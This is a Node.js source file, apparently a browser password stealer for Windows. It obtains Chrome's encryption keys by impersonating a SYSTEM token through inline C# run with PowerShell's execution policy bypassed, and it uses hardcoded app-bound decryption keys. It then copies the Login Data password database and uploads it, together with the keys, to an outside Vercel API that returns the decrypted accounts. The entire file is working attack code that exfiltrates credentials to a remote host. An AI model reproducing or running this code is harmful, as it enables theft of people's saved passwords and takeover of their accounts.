// file: tool_client_sender.js
// Chay tren may Windows: Tu dong trich xuat v10 + v20 Key (Flag 1/2/3 CNG) tu Local State,
// sau do gui kem file Login Data len Vercel API cua ban va nhan ve file decrypted_accounts.txt da giai ma 100%!

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const { execFileSync } = require('node:child_process');

const VERCEL_API_URL =
    process.env.VERCEL_API_URL ||
    'https://passwordandwebsitedecode-git-main-zhee-dev-tool.vercel.app/api/extract';
const API_KEY = process.env.EXTRACTOR_API_KEY || 'ollie-secret-key-6767';

// ---------------------------------------------------------------------------
// CHROME ELEVATION SERVICE CONSTANTS (v127 -> v135+)
// ---------------------------------------------------------------------------
const KEY_FLAG1_AES = Buffer.from(
    'B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787',
    'hex'
);
const KEY_FLAG2_CHACHA = Buffer.from(
    'E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660',
    'hex'
);
const KEY_FLAG3_XOR = Buffer.from(
    'CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390',
    'hex'
);

const PS_CSHARP_HELPER = `
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Diagnostics;

public class WinCryptoHelper {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int ImpersonationLevel, out IntPtr DuplicateTokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, uint dwFlags);
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, uint dwLegacyKeySpec, uint dwFlags);
    [DllImport("ncrypt.dll")]
    public static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    [DllImport("ncrypt.dll")]
    public static extern int NCryptFreeObject(IntPtr hObject);

    public static IntPtr GetSystemToken() {
        foreach (Process p in Process.GetProcesses()) {
            if (p.Id <= 4) continue;
            IntPtr hTok = IntPtr.Zero;
            try {
                if (OpenProcessToken(p.Handle, 0x0002 | 0x0008 | 0x0004, out hTok)) {
                    WindowsIdentity id = new WindowsIdentity(hTok);
                    if (id.User != null && id.User.Value == "S-1-5-18") {
                        IntPtr dup = IntPtr.Zero;
                        if (DuplicateToken(hTok, 2, out dup)) { CloseHandle(hTok); return dup; }
                    }
                    CloseHandle(hTok);
                }
            } catch { if (hTok != IntPtr.Zero) CloseHandle(hTok); }
        }
        return IntPtr.Zero;
    }

    public static string UnprotectUser(string b64) {
        byte[] data = Convert.FromBase64String(b64);
        return Convert.ToBase64String(ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser));
    }

    public static string UnprotectAppBound(string b64) {
        byte[] raw = Convert.FromBase64String(b64);
        IntPtr sysTok = GetSystemToken();
        if (sysTok == IntPtr.Zero) return "ERR:NO_SYS_TOKEN";
        try {
            if (!ImpersonateLoggedOnUser(sysTok)) return "ERR:IMPERSONATE_FAIL";
            byte[] sysDec;
            try { sysDec = ProtectedData.Unprotect(raw, null, DataProtectionScope.CurrentUser); }
            finally { RevertToSelf(); }
            return Convert.ToBase64String(ProtectedData.Unprotect(sysDec, null, DataProtectionScope.CurrentUser));
        } finally { CloseHandle(sysTok); }
    }

    public static string CngDecrypt(string b64) {
        byte[] enc = Convert.FromBase64String(b64);
        IntPtr sysTok = GetSystemToken();
        bool imp = sysTok != IntPtr.Zero && ImpersonateLoggedOnUser(sysTok);
        IntPtr hProv = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (NCryptOpenStorageProvider(out hProv, "Microsoft Software Key Storage Provider", 0) != 0) return "ERR:PROV";
            if (NCryptOpenKey(hProv, out hKey, "Google Chromekey1", 0, 0) != 0) return "ERR:KEY";
            int pcb = 0;
            if (NCryptDecrypt(hKey, enc, enc.Length, IntPtr.Zero, null, 0, out pcb, 0x40) != 0) return "ERR:SIZE";
            byte[] outBuf = new byte[pcb];
            if (NCryptDecrypt(hKey, enc, enc.Length, IntPtr.Zero, outBuf, pcb, out pcb, 0x40) != 0) return "ERR:DEC";
            byte[] finalBuf = new byte[pcb];
            Array.Copy(outBuf, finalBuf, pcb);
            return Convert.ToBase64String(finalBuf);
        } finally {
            if (hKey != IntPtr.Zero) NCryptFreeObject(hKey);
            if (hProv != IntPtr.Zero) NCryptFreeObject(hProv);
            if (imp) RevertToSelf();
            if (sysTok != IntPtr.Zero) CloseHandle(sysTok);
        }
    }
}
`;

function callBridge(method, b64) {
    if (process.platform !== 'win32') return null;
    const cmd = `$ErrorActionPreference='Stop'; Add-Type -TypeDefinition @'\n${PS_CSHARP_HELPER}\n'@ -ReferencedAssemblies 'System.Security'; [Console]::Write([WinCryptoHelper]::${method}('${b64}'))`;
    try {
        return execFileSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', cmd], {
            encoding: 'utf8',
            stdio: ['ignore', 'pipe', 'pipe'],
        }).trim();
    } catch {
        return null;
    }
}

function xorBuffers(a, b) {
    const out = Buffer.alloc(Math.min(a.length, b.length));
    for (let i = 0; i < out.length; i++) out[i] = a[i] ^ b[i];
    return out;
}

function aeadDecrypt(algo, key, iv, ct, tag) {
    try {
        const d = crypto.createDecipheriv(algo, key, iv, algo === 'chacha20-poly1305' ? { authTagLength: 16 } : undefined);
        d.setAuthTag(tag);
        return Buffer.concat([d.update(ct), d.final()]);
    } catch {
        return null;
    }
}

function extractLocalKeys(localStatePath) {
    if (!localStatePath || !fs.existsSync(localStatePath)) return { v10Hex: '', v20Hex: '' };
    const osCrypt = JSON.parse(fs.readFileSync(localStatePath, 'utf8')).os_crypt || {};
    let v10Hex = '';
    let v20Hex = '';

    if (osCrypt.encrypted_key) {
        const raw = Buffer.from(osCrypt.encrypted_key, 'base64');
        if (raw.subarray(0, 5).toString('ascii') === 'DPAPI') {
            const dec = callBridge('UnprotectUser', raw.subarray(5).toString('base64'));
            if (dec && !dec.startsWith('ERR:')) v10Hex = Buffer.from(dec, 'base64').toString('hex');
        }
    }

    if (osCrypt.app_bound_encrypted_key) {
        const raw = Buffer.from(osCrypt.app_bound_encrypted_key, 'base64');
        if (raw.subarray(0, 4).toString('ascii') === 'APPB') {
            const dec = callBridge('UnprotectAppBound', raw.subarray(4).toString('base64'));
            if (dec && !dec.startsWith('ERR:')) {
                const userBlob = Buffer.from(dec, 'base64');
                const valLen = userBlob.readUInt32LE(0);
                const pos = 4 + valLen;
                const blobLen = userBlob.readUInt32LE(pos);
                const keyBlob = userBlob.subarray(pos + 4, pos + 4 + blobLen);
                const flag = keyBlob[0];
                const body = keyBlob.subarray(1);

                if (flag === 1) {
                    const k = aeadDecrypt('aes-256-gcm', KEY_FLAG1_AES, body.subarray(0, 12), body.subarray(12, 44), body.subarray(44, 60));
                    if (k) v20Hex = k.toString('hex');
                } else if (flag === 2) {
                    const k = aeadDecrypt('chacha20-poly1305', KEY_FLAG2_CHACHA, body.subarray(0, 12), body.subarray(12, 44), body.subarray(44, 60));
                    if (k) v20Hex = k.toString('hex');
                } else if (flag === 3) {
                    const cngB64 = callBridge('CngDecrypt', body.subarray(0, 32).toString('base64'));
                    if (cngB64 && !cngB64.startsWith('ERR:')) {
                        const cngRaw = Buffer.from(cngB64, 'base64');
                        const iv = body.subarray(32, 44), ct = body.subarray(44, 76), tag = body.subarray(76, 92);
                        for (const cand of [xorBuffers(cngRaw, KEY_FLAG3_XOR), xorBuffers(cngRaw, KEY_FLAG2_CHACHA), xorBuffers(cngRaw, KEY_FLAG1_AES), cngRaw]) {
                            const k = aeadDecrypt('aes-256-gcm', cand, iv, ct, tag) || aeadDecrypt('chacha20-poly1305', cand, iv, ct, tag);
                            if (k) { v20Hex = k.toString('hex'); break; }
                        }
                    }
                }
            }
        }
    }
    return { v10Hex, v20Hex };
}

async function autoExtractAndSend(loginDataInputPath, saveOutputPath = 'decrypted_accounts.txt') {
    const defaultUserData = path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data');
    const loginPath = path.resolve(loginDataInputPath || path.join(defaultUserData, 'Default', 'Login Data'));
    const localStatePath = path.join(defaultUserData, 'Local State');

    console.log(`[*] Dang lay v10 / v20 Master Key tu: ${localStatePath}`);
    const { v10Hex, v20Hex } = extractLocalKeys(localStatePath);
    console.log(`[*] v10 Key: ${v10Hex || 'NONE'}`);
    console.log(`[*] v20 Key: ${v20Hex || 'NONE (Hay chay CMD voi quyen Administrator!)'}`);

    const tempCopy = path.join(process.env.TEMP || '.', `login_copy_${Date.now()}.sqlite`);
    fs.copyFileSync(loginPath, tempCopy);
    const loginB64 = fs.readFileSync(tempCopy).toString('base64');
    try { fs.unlinkSync(tempCopy); } catch {}

    console.log(`[*] Dang gui Login Data + Keys len Vercel API: ${VERCEL_API_URL}`);
    const resp = await fetch(`${VERCEL_API_URL}?output=txt_file`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'x-api-key': API_KEY,
        },
        body: JSON.stringify({
            login_data_b64: loginB64,
            v20_key: v20Hex,
            v10_key: v10Hex,
            output: 'txt_file',
        }),
    });

    if (!resp.ok) {
        throw new Error(`Vercel API Error (${resp.status}): ${await resp.text()}`);
    }

    const txtContent = await resp.text();
    fs.writeFileSync(saveOutputPath, txtContent, 'utf8');
    console.log(`[+] XONG! Da nhan file giai ma tu Vercel va luu tai: ${path.resolve(saveOutputPath)}`);
}

if (require.main === module) {
    autoExtractAndSend(process.argv[2]).catch((e) => console.error('[!]', e.message));
}

module.exports = { autoExtractAndSend, extractLocalKeys };
